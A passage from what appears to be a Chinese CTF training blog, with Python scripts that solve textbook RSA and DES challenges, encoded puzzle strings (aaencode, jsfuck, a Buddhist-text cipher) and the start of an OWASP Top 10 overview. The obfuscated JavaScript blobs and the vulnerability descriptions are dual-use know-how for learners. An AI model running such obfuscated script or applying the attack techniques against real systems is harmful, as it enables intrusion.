class="line">print(<span class="string">"p = "</span> + str(p))</span><br><span class="line">print(<span class="string">"q = "</span> + str(q))</span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">'d = '</span>+str(d))</span><br><span class="line">m=pow(c,d,n)   <span class="comment">#快速幂取模</span></span><br><span class="line">print(<span class="string">'m = '</span>+str(m))</span><br></pre></td></tr></table></figure></li></ul><p><strong>常见题型的分类</strong></p><p><strong>（1）已知p、q、e求解d</strong></p><p><strong>解题思路：</strong>根据 φ = (p−1) <em> (q−1)这一欧拉函数式， 可以使用所给的p、q求解出n的欧拉函数值φ,之后再根据       e </em> d ≡ 1 (mod φ) 即可求解出d的值。</p><p>题目</p><p><a href="http://www.shiyanbar.com/ctf/1828" rel="external nofollow" target="_blank">http://www.shiyanbar.com/ctf/1828</a></p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p=<span class="number">473398607161</span></span><br><span class="line">    q=<span class="number">4511491</span></span><br><span class="line">    e=<span class="number">17</span></span><br><span class="line">    f_n=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    d=modinv(e,f_n)</span><br><span class="line">    print(d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>已知p、q、e、c求解明文</strong></p><p><strong>思路：</strong>根据<strong>n=p*q</strong>求解出n的值，之后再根据<strong>φ = (p−1) * (q−1)</strong>，求解出n的欧拉函数的值，之后再根据<strong>e * d ≡ 1 (mod φ)</strong>求解出d的值，之后再根据<strong>m≡c^d( mod n) 或 m = pow(c,d,n)</strong>求解出明文信息即可！</p><p>题目</p><p><a href="http://www.shiyanbar.com/ctf/1979" rel="external nofollow" target="_blank">http://www.shiyanbar.com/ctf/1979</a></p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=<span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q=<span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">c=<span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">f_n=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">print(<span class="string">'n:%d'</span>%n)</span><br><span class="line">print(<span class="string">'e:%d'</span>%e)</span><br><span class="line">print(<span class="string">'c:%d'</span>%c)</span><br><span class="line"></span><br><span class="line">d=modinv(e,f_n)</span><br><span class="line">print(<span class="string">'d = '</span>+str(d))</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(<span class="string">"------------"</span>)</span><br><span class="line">print(<span class="string">'message:%d'</span>%m)</span><br></pre></td></tr></table></figure><p>题目</p><p><a href="http://ctf5.shiyanbar.com/crypto/RSAROLL.txt" rel="external nofollow" target="_blank">http://ctf5.shiyanbar.com/crypto/RSAROLL.txt</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_n</span><span class="params">(n)</span>:</span>   <span class="comment">#分解n</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">        <span class="keyword">if</span> n%i == <span class="number">0</span>:</span><br><span class="line">            p = i</span><br><span class="line">            q = int(n/i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line"></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line">p,q=split_n(n)</span><br><span class="line">print(<span class="string">'n:%d'</span>%n)</span><br><span class="line">print(<span class="string">'e:%d'</span>%e)</span><br><span class="line">print(<span class="string">"p = "</span> + str(p))</span><br><span class="line">print(<span class="string">"q = "</span> + str(q))</span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">'d = '</span>+str(d))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'rsa.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> f:</span><br><span class="line">        res+=chr(pow(int(c.replace(<span class="string">'\n'</span>,<span class="string">''</span>)),d,n))</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><ul><li><p>DES（对称算法）</p><p><a href="https://blog.csdn.net/qq_42606051/article/details/81279504" rel="external nofollow" target="_blank">https://blog.csdn.net/qq_42606051/article/details/81279504</a></p><p>题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：74cWby3JysahM3cZudF3gT11lamL/4Cd</span><br><span class="line">key=12345678</span><br><span class="line">求明文</span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'12345678'</span></span><br><span class="line"></span><br><span class="line">des = DES.new(key,DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">encrypted_text=base64.b64decode(<span class="string">'74cWby3JysahM3cZudF3gT11lamL/4Cd'</span>)</span><br><span class="line"></span><br><span class="line">decrypted_text = des.decrypt(encrypted_text)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"明文:"</span>+decrypted_text</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080611.png" alt=""></p></li></ul><ul><li><a href="https://blog.csdn.net/iteye_6478/article/details/82165923" rel="external nofollow" target="_blank">https://blog.csdn.net/iteye_6478/article/details/82165923</a></li></ul><ul><li><p>拓展</p><p>与佛论禅</p><ul><li><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" rel="external nofollow" target="_blank">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">怯勝苦集參哆究梵礙呐度究梵呼梵顛以怯勝豆哆陀哆真罰夜大知涅曳他呐依道多波缽喝侄波缽羅奢喝俱咒冥上奢阿怯喝侄羅以侄朋僧哆婆謹冥地諳顛哆度哆都冥寫有呐阿勝娑哆涅皤怛。怯苦怯南是哆得謹侄訶至故殿故僧道多地罰倒皤利奢喝呐南奢都哆。切是奢究奢藝侄參哆佛曰明諳道彌奢娑阿哆寫娑利梵姪若諦竟奢藐悉奢集諳彌諳遮怯。皤喝阿孕怯曰罰般梵多伊梵耨死哆彌阿輸呐遮冥上哆藐夷冥輸俱故沙恐冥薩侄栗世得。耨夢諳智都冥薩耨俱薩皤密吉怖罰想上罰喝訶罰蒙盧舍神藝哆知呐姪怯那楞皤度遮奢顛度梵咒呐訶悉梵利究即冥夢諳一俱娑怯沙俱三奢婆缽知侄無呐若槃醯想哆故冥怖沙諳一豆曳呐咒心羯有</span><br></pre></td></tr></table></figure></li><li><p>解密前要带上<code>佛曰：</code>或<code>如是我闻：</code>的文字。</p></li></ul></li></ul><ul><li><p>aaencode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br></pre></td></tr></table></figure><ul><li>解密网站  <a href="https://www.qtool.net/decode" rel="external nofollow" target="_blank">https://www.qtool.net/decode</a></li></ul></li></ul><ul><li><p>jsfuck</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]</span><br></pre></td></tr></table></figure><p>chrome控制台解密</p></li></ul><h2 id="day03–7iny"><a href="#day03–7iny" class="headerlink" title="day03–7iny"></a>day03–7iny</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>以下内容以web安全为主，Danie1整理的内网地址为实验室靶场环境，三康庙职业技术学院的同学可在校园网环境下访问。不可访问的同学理解原理学习即可</p><h3 id="OWASP-TOP-10漏洞"><a href="#OWASP-TOP-10漏洞" class="headerlink" title="OWASP TOP 10漏洞"></a>OWASP TOP 10漏洞</h3><h4 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h4><p>2017版TOP10思维导图</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080701.png" alt=""></p><h4 id="TOP10漏洞介绍"><a href="#TOP10漏洞介绍" class="headerlink" title="TOP10漏洞介绍"></a>TOP10漏洞介绍</h4><h5 id="A1-注入-Injection"><a href="#A1-注入-Injection" class="headerlink" title="A1 注入 Injection"></a>A1 注入 Injection</h5><blockquote><p>Web安全头号大敌。注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。攻击者把一些包含攻击代码当做命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据。注入漏洞通常能SQL查询、LDAP查询、OS命令、程序参数等中出现</p></blockquote><h5 id="A2-失效的身份认证和会话管理-Broken-Authentication-and-Session-Management"><a href="#A2-失效的身份认证和会话管理-Broken-Authentication-and-Session-Management" class="headerlink" title="A2 失效的身份认证和会话管理  Broken Authentication and Session Management"></a>A2 失效的身份认证和会话管理  Broken Authentication and Session Management</h5><blockquote><p>与认证和会话管理相关的应用程序功能往往得不到正确管理，这就导致攻击者破坏密码、密匙、会话令牌或利用实施漏洞冒充其他用户身份。</p></blockquote><h5 id="A3-跨站脚本-XSS"><a href="#A3-跨站脚本-XSS" class="headerlink" title="A3 跨站脚本-XSS"></a>A3 跨站脚本-XSS</h5><blockquote><p>XSS的出现时间跟SQL差不多，是最普遍的web应用安全漏洞。当应用程序在发送给浏览器的页面中包含用户提供的数据，但没有经过适当验证或转译，就会导致跨站脚本漏洞。XSS允许攻击者在受害者的浏览器中执行脚本，这些脚本可以劫持用户会话，破坏网站，或将用户重定向到恶意站点。</p></blockquote><h5 id="A4-不安全的直接对象引用-Insecurity-Direct-Object-Reference"><a href="#A4-不安全的直接对象引用-Insecurity-Direct-Object-Reference" class="headerlink" title="A4 不安全的直接对象引用 Insecurity Direct Object Reference"></a>A4 不安全的直接对象引用 Insecurity Direct Object 